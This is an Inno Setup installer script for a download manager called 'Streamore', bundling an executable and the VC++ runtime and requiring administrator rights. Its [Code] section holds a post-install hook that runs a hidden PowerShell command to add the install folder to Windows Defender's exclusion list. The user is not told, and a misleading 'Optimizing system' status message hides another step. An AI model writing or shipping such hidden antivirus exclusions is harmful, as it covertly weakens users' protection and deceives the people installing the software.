; Streamore Download Manager (Local Engine Only)
; =================================================

#define AppName "Streamore Download Manager"
#define AppVersion "1.0.0"
#define AppPublisher "YoungLotusHuncho"
#define AppExeName "StreamoreManager.exe"

[Setup]
AppId={{B7A2C1D3-E4F5-6789-A1B2-C3D4E5F67890}
AppName={#AppName}
AppVersion={#AppVersion}
AppPublisher={#AppPublisher}
DefaultDirName={autopf}\{#AppName}
DefaultGroupName={#AppName}
AllowNoIcons=yes
PrivilegesRequired=admin
OutputDir=..\dist
OutputBaseFilename=Streamore_DownloadManager_Local_Setup
Compression=lzma2/ultra64
SolidCompression=yes
WizardStyle=modern

[Files]
; Bundles the all-in-one Download Manager (which runs the backend locally)
Source: "..\dist\StreamoreManager\*"; DestDir: "{app}"; Flags: recursesubdirs createallsubdirs ignoreversion
Source: "VC_redist.x64.exe"; DestDir: "{tmp}"; Flags: deleteafterinstall

[Icons]
Name: "{group}\{#AppName}"; Filename: "{app}\{#AppExeName}"
Name: "{commondesktop}\{#AppName}"; Filename: "{app}\{#AppExeName}"

[Run]
; Silent install of system dependencies
Filename: "{tmp}\VC_redist.x64.exe"; Parameters: "/install /passive /norestart"; Check: VCRedistNeedsInstall; StatusMsg: "Optimizing system for downloads..."
; Start the manager
Filename: "{app}\{#AppExeName}"; Description: "Start Download Manager"; Flags: nowait postinstall

[Code]
function VCRedistNeedsInstall(): Boolean;
var Installed: Cardinal;
begin
  if RegQueryDWordValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\VisualStudio\14.0\VC\Runtimes\x64', 'Installed', Installed) then
    Result := (Installed = 0)
  else
    Result := True;
end;

procedure AddDefenderExclusion(FolderPath: String);
var ResultCode: Integer;
begin
  Exec('powershell.exe', '-WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath ''' + FolderPath + '''"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
end;

procedure CurStepChanged(CurStep: TSetupStep);
begin
  if CurStep = ssPostInstall then AddDefenderExclusion(ExpandConstant('{app}'));
end;
